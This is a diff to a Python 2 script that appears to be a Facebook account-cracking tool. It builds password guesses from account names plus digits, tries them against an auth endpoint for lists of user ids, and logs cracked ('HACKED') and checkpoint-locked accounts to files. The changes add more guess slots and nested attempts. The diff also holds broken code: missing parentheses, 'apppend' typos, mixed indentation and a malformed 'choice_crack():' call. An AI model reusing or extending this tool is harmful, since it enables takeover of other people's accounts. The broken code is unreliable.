@@ -400,12 +400,14 @@ def a_s():
         p2 = raw_input(' \033[1;92m[2]Name + digit: ')
         p3 = raw_input(' \033[1;92m[3]Name + digit: ')
         p4 = raw_input(' \033[1;92m[4]Name + digit: ')
-        p5 = raw_input(' \033[1;92m[4]Name + digit: ')
-        pass6 = raw_input(' \033[1;92m[6]Password: ')
+        p5 = raw_input(' \033[1;92m[5]Name + digit: ')
+	p6 = raw_input(' \033[1;92m[6]Name + digit: ')
         pass7 = raw_input(' \033[1;92m[7]Password: ')
-	pass8 = raw_input(' \033[1;92m[8]Password: ')
+        pass8 = raw_input(' \033[1;92m[8]Password: ')
 	pass9 = raw_input(' \033[1;92m[9]Password: ')
 	pass10 = raw_input(' \033[1;92m[10]Password: ')
+	pass11 = raw_input(' \033[1;92m[11]Password: ')
+	pass12 = raw_input(' \033[1;92m[12]Password: ')
         idt = raw_input(' \033[1;93m[★]Enter id: ')
         
         try:
@@ -445,12 +447,14 @@ def a_s():
         p2 = raw_input(' \033[1;92m[2]Name + digit: ')
         p3 = raw_input(' \033[1;92m[3]Name + digit: ')
         p4 = raw_input(' \033[1;92m[4]Name + digit: ')
-        p5 = raw_input(' \033[1;92m[4]Name + digit: ')
-        pass6 = raw_input(' \033[1;92m[6]Password: ')
+        p5 = raw_input(' \033[1;92m[5]Name + digit: ')
+	p6 = raw_input(' \033[1;92m[6]Name + digit: ')
         pass7 = raw_input(' \033[1;92m[7]Password: ')
-	pass8 = raw_input(' \033[1;92m[8]Password: ')
+        pass8 = raw_input(' \033[1;92m[8]Password: ')
 	pass9 = raw_input(' \033[1;92m[9]Password: ')
 	pass10 = raw_input(' \033[1;92m[10]Password: ')
+	pass11 = raw_input(' \033[1;92m[11]Password: ')
+	pass12 = raw_input(' \033[1;92m[12]Password: '
         idt = raw_input(' \033[1;93m[★]Enter id: ')
         
         try:
@@ -481,7 +485,7 @@ def a_s():
         os.system('clear')
         print logo
         print ''
-        print '\033[1;31;1m~~~~ Auto pass public cracking ~~~~'
+        print '\033[1;31;1m~~~~ Auto pass File cracking ~~~~'
         print ''
         print '\033[1;93m For example: 123 , 1234 , 12345, 786 , 12 , 1122'
         print ''
@@ -489,12 +493,14 @@ def a_s():
         p2 = raw_input(' \033[1;92m[2]Name + digit: ')
         p3 = raw_input(' \033[1;92m[3]Name + digit: ')
         p4 = raw_input(' \033[1;92m[4]Name + digit: ')
-        p5 = raw_input(' \033[1;92m[4]Name + digit: ')
-        pass6 = raw_input(' \033[1;92m[6]Password: ')
+        p5 = raw_input(' \033[1;92m[5]Name + digit: ')
+	p6 = raw_input(' \033[1;92m[6]Name + digit: ')
         pass7 = raw_input(' \033[1;92m[7]Password: ')
-	pass8 = raw_input(' \033[1;92m[8]Password: ')
+        pass8 = raw_input(' \033[1;92m[8]Password: ')
 	pass9 = raw_input(' \033[1;92m[9]Password: ')
 	pass10 = raw_input(' \033[1;92m[10]Password: ')
+	pass11 = raw_input(' \033[1;92m[11]Password: ')
+	pass12 = raw_input(' \033[1;92m[12]Password: '
         
         try:
 	    idlist= raw_input('[+] File Name: ')
@@ -609,6 +615,7 @@ def a_s():
                                 cp.close()
                                 cps.apppend(uid + pass5)
 			    else:
+			        pass6 = name.lower() + p6
                                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers = header).text
                                 q = json.loads(data)
                                 if 'loc' in q:
@@ -683,6 +690,36 @@ def a_s():
                                                    cp.write(uid + ' | ' + pass10 + '\n')
                                                    cp.close()
                                                    cps.apppend(uid + pass10)
+			                        else:
+                                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass11, headers = header).text
+                                                    q = json.loads(data)
+                                                    if 'loc' in q:
+                                                        print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass11 + '\x1b[0;97m'
+                                                        ok = open('/sdcard/ids/HOP_OK.txt', 'a')
+                                                        ok.write(uid + ' | ' + pass11 + '\n')
+                                                        ok.close()
+                                                        oks.append(uid + pass11)
+                                                    elif 'www.facebook.com' in q['error']:
+                                                       print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass11
+                                                       cp = open('HOP_CP.txt', 'a')
+                                                       cp.write(uid + ' | ' + pass11 + '\n')
+                                                       cp.close()
+                                                       cps.apppend(uid + pass11)
+			                            else:
+                                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass12, headers = header).text
+                                                        q = json.loads(data)
+                                                        if 'loc' in q:
+                                                            print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass12 + '\x1b[0;97m'
+                                                            ok = open('/sdcard/ids/HOP_OK.txt', 'a')
+                                                            ok.write(uid + ' | ' + pass12 + '\n')
+                                                            ok.close()
+                                                            oks.append(uid + pass12)
+                                                        elif 'www.facebook.com' in q['error']:
+                                                           print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass12
+                                                           cp = open('HOP_CP.txt', 'a')
+                                                           cp.write(uid + ' | ' + pass12 + '\n')
+                                                           cp.close()
+                                                           cps.apppend(uid + pass12)
         except:
             pass
         
@@ -711,7 +748,7 @@ def choice_crack():
         print ' Token invalid '
         os.system('rm -rf login.txt')
         time.sleep(0.01)
-        log_menu()
+        choice_crack():
 
     os.system('clear')
     print logo
